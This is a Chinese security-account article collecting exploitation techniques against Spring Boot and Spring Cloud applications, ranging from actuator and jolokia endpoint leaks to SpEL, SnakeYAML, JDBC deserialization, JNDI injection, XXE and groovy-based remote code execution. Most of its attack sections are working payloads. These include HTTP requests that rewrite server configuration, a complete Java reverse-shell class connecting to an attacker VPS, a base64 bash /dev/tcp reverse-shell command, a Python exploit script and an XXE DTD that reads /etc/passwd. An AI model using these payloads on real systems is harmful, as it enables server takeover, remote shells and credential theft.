#  Java之SpringBoot漏洞利用姿势合集总结详细版   
1849156050238568  Z2O安全攻防   2024-07-08 20:42  
  
点击上方[蓝字]，关注我们  
  
  
**建议大家把公众号“Z2O安全攻防”设为星标，否则可能就看不到啦！**  
因为公众号现在只对常读和星标的公众号才能展示大图推送。操作方法：点击右上角的【...】，然后点击【设为星标】即可。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuao3T9EnGbUIqxgDhEVicCV8NbH4FiaZ3YIbpXNEr6qFicGkAelnQHKGHsVlfapMGgO3DHA68iaiac0n4Q/640?wx_fmt=png "")  
  
  
# 免责声明  
  
  
本文仅用于技术讨论与学习，利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者及本公众号团队不为此承担任何责任。  
  
# 文章正文  
  
  
# Spring框架简述  
  
Spring 框架是一个功能强大的 Java 应用程序框架，旨在提供高效且可扩展的开发环境，不同部分的讲解，Spring生态系统中有五个关键部分，分别是Spring Framework、Spring Boot、Spring Cloud、Spring Security和Spring MVC简述如下：  
```
Spring Framework
核心架构：提供依赖注入（IoC）、面向切面编程（AOP）、数据访问和事务管理等基础功能。
Spring MVC：用于构建Web应用程序和RESTful服务的MVC框架。
Spring MVC
Web框架：基于SpringFramework的模块，用于开发Web应用和API。
主要特性：DispatcherServlet、注解驱动、视图解析等。
SpringBoot
简化开发：基于SpringFramework，提供自动配置、内嵌服务器、快速启动等功能。
主要特性：自动配置、内嵌Tomcat、独立运行、Starter依赖。
SpringCloud
微服务架构：基于SpringBoot，提供构建分布式系统和微服务的工具。
主要特性：服务发现、负载均衡、配置管理、断路器、API网关等。
SpringSecurity
安全框架：为Spring应用提供认证和授权功能。
主要特性：身份验证、访问控制、Web安全保护。
它们的关系
SpringFramework：基础框架，包含核心功能和Spring MVC。
Spring MVC：SpringFramework中的Web框架模块。
SpringBoot：简化Spring应用开发，内置于SpringFramework之上。
SpringCloud：基于SpringBoot，支持微服务架构。
SpringSecurity：集成在SpringFramework中，提供安全功能。
```  
# Spring Boot Starter  
  
如果只是将xml配置换成javaconfig配置，其实减少不了配置的工作量。我们配置工作量的减少，还得感谢Spring Boot Starter，是它帮我们完成了大量的配置工作，我们只需完成很少一部分配置即可。  
  
springboot自动配置用到的注解 @SpringBootApplication、@SpringBootConfiguration、@ComponentScan @EnableAutoConfiguration、@AutoConfigrationPackage、@EnableConfigurationProperties外部配置文件导入注解 @PropertySource定时任务用到注解 @EnableScheduling、@Scheduled、@EnableAsync、@Async过滤器 @WebFilter、@ServletComponentScan拦截器监听器校验器 @Validated异常处理 @ControllerAdvice、@ExceptionHandler  
  
自动加载原理：SpringBoot 在启动时会去依赖的starter包中寻找 resources/META- INF/spring.factories文件，然后根据文件中配置的Jar包去扫描项目所依赖的Jar包，这类似于 Java 的 SPI 机制。注释：SPI的英文名称是Service Provider Interface，是Java 内置的服务发现机制。根据spring.factories配置加载AutoConfigure类。根据 @Conditional注解的条件，进行自动配置并将Bean注入Spring Context上下文当中  
# springboot-cve_2021_21234  
  
环境：vulfocus.cnSpring Boot是由Pivotal团队提供的全新框架，其设计目的是用来简化新Spring应用的初始搭建以及开发过程。该框架使用了特定的方式来进行配置，从而使开发人员不再需要定义样板化的配置。通过这种方式，Spring Boot致力于在蓬勃发展的快速应用开发领域(rapid application development)成为领导者。  
  
存在文件包含漏洞漏洞Poc/manage/log/view?filename=/etc/passwd&base=../../../../../../../../../../修复方案：升级到 0.2.13  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuZ0ibrvNzNPR8szNSPIQL1Hlf1RcNVxU1jP7rWjRs56yy2ubF3e91nt4amCjcRibqwkN6OsRFfRFcdg/640?wx_fmt=png&from=appmsg "null")  
## SpringCloud  
  
Spring Cloud是基于 Spring Boot 来进行构建服务，并提供如配置管理、服务注册与发现、智能路由等常见功能的帮助快速开发分布式系统的系列框架的有序集合。参考大师傅的一张图：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuZ0ibrvNzNPR8szNSPIQL1HloeVkIQg0v8ic1dBO7IQYYgjN1P2qZQ3w6sR4ooiakGhHdg6l8PT803EA/640?wx_fmt=png&from=appmsg "null")  
### 信息泄露漏洞  
  
此漏洞主要就是一些路由地址和接口的信息泄露，验证路由如下利用工具springscan 扫描  
```
/v2/api-docs
/swagger-ui.html
/env

//获取参数信息
/mappings
/metrics
/beans
/configprops
/actuator/metrics
/actuator/mappings
/actuator/beans
/actuator/configprops
```  
### 敏感信息明文获取  
  
如果说目标网站存在一些接口依赖 jolokia-cor如/jolokia、/actuator/jolokia  
- • **调用 org.springframework.boot Mbean**  
  
实际上是调用org.springframework.boot.admin.SpringApplicationAdminMXBeanRegistrar 类实例的 getProperty方法poc  
```
//spring 1.x 版本

markup
POST /jolokia
Content-Type: application/json

{"mbean":"org.springframework.boot:name=SpringApplication,type=Admin","operation":"getProperty","type":"EXEC","arguments":["security.user.password"]}

//spring 2.x 版本

markup
POST /actuator/jolokia
Content-Type: application/json

{"mbean":"org.springframework.boot:name=SpringApplication,type=Admin","operation":"getProperty","type":"EXEC","arguments":["security.user.password"]}
```  
### 远程代码执行  
  
主要问题是在于springboot存在一些组件漏洞造成的的，总结如下一些方法  
# Spring Boot whitelabel error page 远程命令执行漏  
  
漏洞原理：主要是因为使用了springboot默认错误页在处理参数值使用递归流程，流程进入到PropertyPlaceholderHelper 类中，${}包围的内容都会被 org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration 类的 resolvePlaceholder 方法当作 SpEL 表达式被解析执行，造成 RCE 漏洞漏洞文件：ErrorMvcAutoConfiguration.java  
  
漏洞复现，测试网站是否存在Whitelabel Error Page，通过fuzz一些参数值，如id、sid存在500报错，则可以测试去执行Spel表达式注入  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuZ0ibrvNzNPR8szNSPIQL1HlnNWG5iaUQUWEU8icT4xicQjuJJyQKXzvN81TyMv4uia1rInM40Gk6m4THw/640?wx_fmt=png&from=appmsg "null")  
  
漏洞poc生成16进制的脚本  
```
input_string = "open -a Calculator"
hex_list =[]

for ch in input_string:
# 将字符转换为十六进制表示，并添加到列表中
    hex_list.append(f"0x{ord(ch):02x}")

hex_string =', '.join(hex_list)
print(hex_string)



//测试漏洞是否存在
${6*6}//看是否有返回36

//执行Calc命令
${T(java.lang.Runtime).getRuntime().exec(newString(newbyte[]{0x63,0x61,0x6c,0x63}))}
```  
# spring cloud SnakeYAML 远程命令执行  
  
利用条件：通过去查看是否存在/env 或 /actuator/env泄露，请求是否存在spring-boot-starter- actuator，目标主机可出网，且版本小于1.3.0.RELEASE漏洞原理：Spring Cloud 配置通过 spring.cloud.bootstrap.location 指向恶意 YML 文件 URL，触发 refresh 请求该文件，利用 SnakeYAML 反序列化漏洞拉取恶意 JAR 并实例化其中的 javax.script.ScriptEngineFactory 实现类，导致远程代码执行（RCE）。  
  
漏洞复现过程：  
  
1、 在vps主机开放一个端口上传一个exp.yml文件进行远程加载，写入恶意执行代码执行  
  
参考：https://github.com/artsploit/yaml-payload  
```
javac src/artsploit/AwesomeScriptEngineFactory.java
jar -cvf yaml-payload.jar -C src/ .
```  
  
2、设置spring.cloud.bootstrap.location 属性  
  
构造poc如下，分为spring1.x 和 spring2.x  
```
//spring 1.x
POST /env
Content-Type: application/x-www-form-urlencoded

spring.cloud.bootstrap.location=http://vps:port/exp.yml

//spring 2.x
POST /actuator/env
Content-Type: application/x-www-form-urlencoded

spring.cloud.bootstrap.location=http://vps:port/exp.yml
```  
  
3、 刷新配置refresh  
  
poc如下  
```
//spring 1.x
POST /refresh
Content-Type: application/x-www-form-urlencoded

//spring 2.x
POST /actuator/refresh
Content-Type: application/x-www-form-urlencoded
```  
# springboot mysql jdbc deserialization 远程代码执行  
  
简述：Java Database Connectivity (JDBC) 是Java中用于连接和执行数据库操作的API。它提供了一组标准接口，使开发人员能够使用Java代码与各种关系数据库进行交互。  
  
利用条件：访问/env 或 /actutar/env接口查询是否存在mysql-connector-java 依赖  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuZ0ibrvNzNPR8szNSPIQL1HlvS1Y0wKVUlweEZo5j8FmyhwTdeOdEQUibQK4hqSKIyLw0N39TjU6sibw/640?wx_fmt=png&from=appmsg "null")  
  
进一步观察是否存在常见的反序列化gadget依赖，如 commons- collections、Jdk7u21、Jdk8u20等，观察版本并记录，搜索关键词spring.datasource.url，记录value值(方便恢复)  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuZ0ibrvNzNPR8szNSPIQL1HlqSiaqGBoGWaYcRYzMACA2fhiakQgoF5ibQtr7Vjh2RDQ0YdeHSoB2GayQ/640?wx_fmt=png&from=appmsg "null")  
  
漏洞利用：根据属性条件进行修改调用mysql jdbc，判断具体情况利用，未授权可能影响业务数据，流程如下不同版本mysql-connector-java 5.x 和 mysql-connector-java 8.x，poc如下  
```
//mysql-connector-java 5.x
jdbc:mysql://your-vps-ip:3306/mysql?characterEncoding=utf8&useSSL=false&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true

//mysql-connector-java 8.x
jdbc:mysql://your-vps-ip:3306/mysql?characterEncoding=utf8&useSSL=false&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true
```  
  
同理判断是否存在 /env 或/actuator/env  
```
//spring 1.x
POST /env
Content-Type: application/x-www-form-urlencoded

spring.datasource.url=对应属性值

//spring 2.x
POST /actuator/env
Content-Type: application/json

{"name":"spring.datasource.url","value":"对应属性值"}
```  
  
修改完成后进行刷新配置，再触发即可访问 /refresh或/actuator/refresh刷新配置，最后触发查询，访问/product/list去触发漏洞，如果没有则需要找其他数据库查询接口  
  
修复业务：需要还原spring.datasource.url的value值为初始的，以防损害业务！！  
# h2 database console JNDI 命令执行  
  
简述：H2 database是一款Java内存数据库，多用于单元测试。H2 database自带一个Web管理页面，在Spring开发中，如果我们设置如下选项，即可允许外部用户访问Web管理页面，且没有鉴权  
```
spring.h2.console.enabled=true
spring.h2.console.settings.web-allow-others=true
```  
  
利用条件：存在下述界面：访问/h2-console  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuZ0ibrvNzNPR8szNSPIQL1HlibIrxDtsJcrgP7ynHSqD5rf2xHy5Eq9c4urygBgZbuYXepvmsyujU2w/640?wx_fmt=png&from=appmsg "null")  
  
漏洞利用：https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0  
  
1、下载后放入vps中加载，运行命令如下，注意这里版本需要java8环境  
```
//执行：bash -i >& /dev/tcp/VPS/1234 0>&1 的Base64
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C 'bash -c {echo,反弹shell的base64}|{base64,-d}|{bash,-i}' -A VPS
```  
  
2、开启vps监听端口3333  
  
选择生成的url links，这里用rmi地址  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuZ0ibrvNzNPR8szNSPIQL1Hlam2zc81glRGX1p206Mb9Sib0ohHibiaBhuhWYF8MJ7p97Zd6sFENnpWOw/640?wx_fmt=png&from=appmsg "null")  
  
监听端口成功反弹shell![image.png]  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuZ0ibrvNzNPR8szNSPIQL1Hlam2zc81glRGX1p206Mb9Sib0ohHibiaBhuhWYF8MJ7p97Zd6sFENnpWOw/640?wx_fmt=png&from=appmsg "null")  
# jolokia logback JNDI 命令执行  
  
简介：Jolokia是一款开源产品，用于为JMX（Java Management Extensions）技术提供HTTP API接口。其中，该产品提供了一个API，用于调用在服务器上注册的MBean并读/写其属性。JMX技术用于管理和监视设备、应用程序和网络驱动的服务。利用条件：看网站是否泄露/jolokia或/actuator/jolokia接口，进一步看目标是否使用jolokia- core依赖，判断是否出网，漏洞利用是JDNI注入，版本限制为：jdk < 6u201/7u191/8u182/11.0.1(LDAP)  
  
漏洞利用：访问/jolokia/list接口，查看是否存在ch.qos.logback.classic，也就是logback库下的reloadByURL可以造成JNDI注入  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuZ0ibrvNzNPR8szNSPIQL1Hlt4ib8n8uSibu5sQ4LVjInxUo7FeQ64jpOXLoOFd9PecvfabevUpcUoKw/640?wx_fmt=png&from=appmsg "null")  
  
步骤流程如下  
  
1、 在vps上放入xml文件进行加载，内容如下  
```
//文件内容如下
<configuration>
  <insertFromJNDI env-entry-name="ldap://VPS:1389/JNDIObject" as="appName" />
</configuration>
```  
  
2、 编写用来反弹shell的代码JNDIObject.java  
```
/** 运行
 *  javac -source 1.5 -target 1.5 JNDIObject.java
 *
 *  Build By LandGrey
 * */

import java.io.File;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

publicclassJNDIObject{
static{
try{
String ip ="your-vps-ip";
String port ="3333";//反弹shell端口
String py_path =null;
String[] cmd;
if(!System.getProperty("os.name").toLowerCase().contains("windows")){
String[] py_envs =newString[]{"/bin/python","/bin/python3","/usr/bin/python","/usr/bin/python3","/usr/local/bin/python","/usr/local/bin/python3"};
for(int i =0; i < py_envs.length;++i){
String py = py_envs[i];
if((newFile(py)).exists()){
                        py_path = py;
break;
}
}
if(py_path !=null){
if((newFile("/bin/bash")).exists()){
                        cmd =newString[]{py_path,"-c","import pty;pty.spawn(\"/bin/bash\")"};
}else{
                        cmd =newString[]{py_path,"-c","import pty;pty.spawn(\"/bin/sh\")"};
}
}else{
if((newFile("/bin/bash")).exists()){
                        cmd =newString[]{"/bin/bash"};
}else{
                        cmd =newString[]{"/bin/sh"};
}
}
}else{
                cmd =newString[]{"cmd.exe"};
}
Process p =(newProcessBuilder(cmd)).redirectErrorStream(true).start();
Socket s =newSocket(ip,Integer.parseInt(port));
InputStream pi = p.getInputStream();
InputStream pe = p.getErrorStream();
InputStream si = s.getInputStream();
OutputStream po = p.getOutputStream();
OutputStream so = s.getOutputStream();
while(!s.isClosed()){
while(pi.available()>0){
                    so.write(pi.read());
}
while(pe.available()>0){
                    so.write(pe.read());
}
while(si.available()>0){
                    po.write(si.read());
}
                so.flush();
                po.flush();
Thread.sleep(50L);
try{
                    p.exitValue();
break;
}catch(Exception e){
}
}
            p.destroy();
            s.close();
}catch(Throwable e){
            e.printStackTrace();
}
}
}
```  
  
这里需要用低版本兼容运行  
```
javac -source 1.5 -target 1.5 JNDIObject.java
//生成JNDIObject.class 拷贝到vps根目录
```  
  
3、 开启恶意的ldap服务  
  
利用项目：https://github.com/mbechler/marshalsec，命令如下  
```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://VPS:port/#JNDIObject 1389
```  
  
监听反弹shell 端口3333  
  
4、 从外部进行远程加载日志配置文件从而RCE  
  
访问地址如下  
```
/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/vps:port!/example.xml
```  
# jolokia Realm JNDI 命令执行  
  
利用条件和上面差不多，访问接口/jolokia 或 /actuator/jolokia  
  
漏洞利用：流程如下：访问 /actuator/jolokia/list 路由搜索 logback 和 reloadByURL, 发现目标未启用 logback 组件。在 jolokia-realm-jndi-rce 中使用 marshalsec-0.0.3-SNAPSHOT-all.jar来进行 JNDI 注入，依赖于目标使用的 JDK 版本，对于 OracleJDK11.0.1、8u191、7u201、6u211 或者更高版本的 JDK, 限制加载远程 codebase.  
  
1、 访问 /jolokia/list接口，查看是否存在 type=MBeanFactory和 createJNDIRealm 关键词，编写用来反弹shell的代码JNDIObject.java，将编译好的class文件放到网站根目录  
```
javac -source 1.5 -target 1.5 JNDIObject.java
```  
  
2、 利用marshalsec开启恶意的rmi服务  
```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://vps:port/#JNDIObject 1389
```  
  
3、 开启监听端口3333，调用进行加载触发，利用exp如下  
```
#!/usr/bin/env python3

import requests


url ='http://地址/jolokia'


create_realm ={
"mbean":"Tomcat:type=MBeanFactory",
"type":"EXEC",
"operation":"createJNDIRealm",
"arguments":["Tomcat:type=Engine"]
}

wirte_factory ={
"mbean":"Tomcat:realmPath=/realm0,type=Realm",
"type":"WRITE",
"attribute":"contextFactory",
"value":"com.sun.jndi.rmi.registry.RegistryContextFactory"
}

write_url ={
"mbean":"Tomcat:realmPath=/realm0,type=Realm",
"type":"WRITE",
"attribute":"connectionURL",
"value":"rmi://your-vps-ip:1389/JNDIObject"
}

stop ={
"mbean":"Tomcat:realmPath=/realm0,type=Realm",
"type":"EXEC",
"operation":"stop",
"arguments":[]
}

start ={
"mbean":"Tomcat:realmPath=/realm0,type=Realm",
"type":"EXEC",
"operation":"start",
"arguments":[]
}

flow =[create_realm, wirte_factory, write_url, stop, start]

for i in flow:
print('%s MBean %s: %s ...'%(i['type'].title(), i['mbean'], i.get('operation', i.get('attribute'))))
    r = requests.post(url, json=i)
    r.json()
print(r.status_code)
```  
  
命令：python3 exp.py  
# jolokia XXE 任意文件读取  
  
源码复现：git clone [https://github.com/veracode-research/actuator- testbed.git](https://github.com/veracode-research/actuator-testbed.git)  
影响版本：Spring Boot 2.x  
漏洞原因：该框架使用了特定的方式来进行配置，从而使开发人员不再需要定义样板化的配置。对于此漏洞，Spring boot  
 会把 /! 解析成 /  
，导致可以部署xml  
脚本进行远程加载解析  
漏洞条件：  
访问/jolokia/list  
接口，在页面搜索logback  
，查看是否存在logback  
 库提供的reloadByURL  
方法，根据响应页面存在logback  
 库提供的reloadByURL  
方法  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuZ0ibrvNzNPR8szNSPIQL1HlRgW0ib5VwXFkzGFljVxxmT4JA3tibKAAS9wYY6tvJon3ZegKrrM3dlzg/640?wx_fmt=png&from=appmsg "null")  
  
漏洞复现：  
  
1、 在vps上创建logback.xml，内容如下  
```
<?xml version="1.0" encoding="utf-8" ?>
<!DOCTYPE a [ <!ENTITY % remote SYSTEM "http://vps:4444/xxe.dtd">%remote;%int;]>
<a>&trick;</a>
```  
  
2、 创建一个外部实体文件xxe.dtd  
```
<!ENTITY % d SYSTEM "file:///etc/passwd">
<!ENTITY % int "<!ENTITY trick SYSTEM ':%d;'>">
```  
  
3、vps开启监听端口4444进行请求远程文件logback.xml，加载dtd文件触发文件读取漏洞，poc如下  
```
/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/VPSIP地址!/logback.xml
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuZ0ibrvNzNPR8szNSPIQL1Hlw1uhw5QVu6zXIalKVP4xQRnxib35Ydr1m0s2gY4iclJxtQxshHXNUnkA/640?wx_fmt=png&from=appmsg "null")  
# SpringBoot Actuator之restart logging.config grovvy命令执行  
  
第一种：简述：根据springboot相关文档说明：可通过Spring 环境属性logging.config进一步设置配置文件的位置。利用条件：存在/actuator/restart接口，存在groovy依赖漏洞利用：关键代码在org.springframework.boot.context.logging.LoggingApplicationListener#initialize()方法中，logback- classic 组件的 ch.qos.logback.classic.util.ContextInitializer.java 代码文件逻辑中会判断 url 是否以 groovy 结尾漏洞复现：  
  
1、远程加载.groovy文件，这里写入一个exp.groovy  
```
//VPS写入一个命令执行函数
Runtime.getRuntime().exec("open -a Calculator")
Runtime.getRuntime().exec("calc")

python -m http.server 1234
```  
  
2、设置logging.config属性，poc如下  
```
//spring 1.x
POST /env
Content-Type: application/x-www-form-urlencoded

logging.config=http://vps:port/exp.groovy

//spring 2.x
POST /actuator/env
Content-Type: application/json

{"name":"logging.config","value":"http://vps:port/exp.groovy"}
```  
  
3、 最后访问/restart或 /actuator/restart重新应用即可加载命令执行。  
  
注意此操作会重启业务运行，请授权测试  
  
另一种姿势：restart spring.main.sources groovy 命令执行，同理也是需要groovy依赖，poc如下  
```
//spring 1.x
POST /env
Content-Type: application/x-www-form-urlencoded

spring.main.sources=http://vps:port/exp.groovy

//spring 2.x
POST /actuator/env
Content-Type: application/json

{"name":"spring.main.sources","value":"http://vps:port/exp.groovy"}
```  
  
然后重启等待加载即可，最终是正常访问/actuator/env接口的  
# SpringBoot Actuator之restart logback JNDI 命令执行  
  
利用条件：JNDI 服务返回的 object 需要实现javax.naming.spi.ObjectFactory 接口，存在/env和/restart接口spring actuator 1.x 开启 restart 需要配置: endpoints.restart.enabled=true spring actuatorspring actuator 2.x 开启 restart 需要配置: management.endpoint.restart.enabled=true  
  
漏洞复现：  
  
1、在根目录创建一个xml文件，通过远程去加载exp.xml  
```
//这里base64为命令执行语句
<configuration>
  <insertFromJNDI env-entry-name="ldap://vvps:1389/TomcatBypass/Command/Base64/Y2FsYw==" as="appName" />
</configuration>
```  
  
2、vps上开启ldap服务并启动  
```
java -jar JNDIExploit-1.0-SNAPSHOT.jar -i your-vps-ip
```  
  
3、 请求/env去设置logging.config属性  
```
//spring 1.x
POST /env
Content-Type: application/x-www-form-urlencoded

logging.config=http://vps:port/exp.xml

//spring 2.x
POST /actuator/env
Content-Type: application/json

{"name":"logging.config","value":"http://vps:ip/exp.xml"}
```  
  
4、最后访问 /restart 或 /actuator/restart重启即可  
  
提：如果说存在相关 tomcat 版本的话，也可以用javax.el.ELProcessor作为 Reference Factory来绕过高版本 JDK 的限制。  
# SpringBoot Actuator之restart logging.config grovvy命令执行  
  
利用条件：需要存在/env和/restart接口，环境需要存在h2database、spring-boot-starter-data- jpa相关依赖，返回错误的h2 sql语法漏洞利用：  
  
1、vps上进行存放.sql文件进行远程加载，内容如下  
```
CREATE ALIAS T5 AS CONCAT('void ex(String m1,String m2,String m3)throws Exception{Runti','me.getRun','time().exe','c(new String[]{m1,m2,m3});}');CALL T5('/bin/bash','-c','calc');
```  
  
2、设置spring.datasource.data属性  
```
//spring 1.x
POST /env
Content-Type: application/x-www-form-urlencoded

spring.datasource.data=http://vps:port/exp.sql

//spring 2.x
POST /actuator/env
Content-Type: application/x-www-form-urlencoded

spring.datasource.data=http://vps:port/exp.sql
```  
  
3、最终重启应用即可，访问/restart或 /actutar/restart接口  
  
结：闲暇之余，学习总结一下springboot相关知识，路漫漫其修远兮，如若有误，欢迎师傅指出。  
  
文章来源：https://xz.aliyun.com/t/14866  
  
  
### 考证咨询  
  
  
最优惠报考  
各类安全证书(NISP/CISP/CISSP/PTE/PTS/PMP/IRE等....)，后台回复"  
好友位"咨询。  
  
# 技术交流  
  
  
### 学习圈子  
  
  
  
一个引导大家一起成长，系统化学习的圈子。  
  
  
如果看到这里的师傅是基础不够扎实/技术不够全面/入行安全不久/有充足时间的初学者...其中之一，那么欢迎加入我们的圈子，圈子提供以下内容：  
  
  
**1、每周发布学习任务，由浅入深，循序渐进，从常见的Web漏洞原理与利用、业务逻辑漏洞与挖掘，到WAF绕过、代码审计、钓鱼与免杀，再到Linux/Windows内网、提权、权限维持、隧道代理、域渗透，层层递进。会发布相应的参考资料及建议，成员自行学习实践，并会根据每周任务选取1-3位完成优秀的成员，返还入圈费用。**  
  
2、日常分享优质学习资源与攻防渗透技巧，包括但不限于渗透tips、教程、手册、学习路线等。  
  
3、  
一个学习氛围浓厚的社区，遇到问题可以快速提问、交流讨论，共同学习。  
- 目前已经规划了几个月的内容：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYHyEqA6pDb8VLMp8HsIicKjI8JbTjQ6Qv5fib5NL1mUqWgkHF130FUezb0uwppCQTOnuHrw5fpLHog/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
欢迎加入我们，一起学习！  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/h8P1KUHOKuZ9O4iae49hDfCW7hmqiaYclNdZyaia683iaEkabOCRQeXcd8TP3TUWx3wtDllnJb5f4ic8hVL69OhwDaw/640?wx_fmt=jpeg&from=appmsg "")  
  
  
### 交流群  
  
  
关注公众号回复“**加群**”，添加Z2OBot好友，自动拉你加入**Z2O安全攻防交流群(微信群)**分享更多好东西。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKuYMO5aHRB3TbIy3xezlTAkbFzqIRfZNnicxSC23h1UmemDu9Jq38xrleA6NyoWBu1nAj0nmE6YXEHg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
### 关注我们  
  
  
  
**关注福利：**  
  
**回复“**  
**app****" 获取  app渗透和app抓包教程**  
  
**回复“**  
**渗透字典****" 获取 针对一些字典重新划分处理，收集了几个密码管理字典生成器用来扩展更多字典的仓库。**  
  
**回复“漏洞库" 获取 最新漏洞POC库(**  
**1.2W+****)******  
  
**回复“资料" 获取 网络安全、渗透测试相关资料文档**  
  
****  
点个【 在看 】，你最好看  
  
  
  
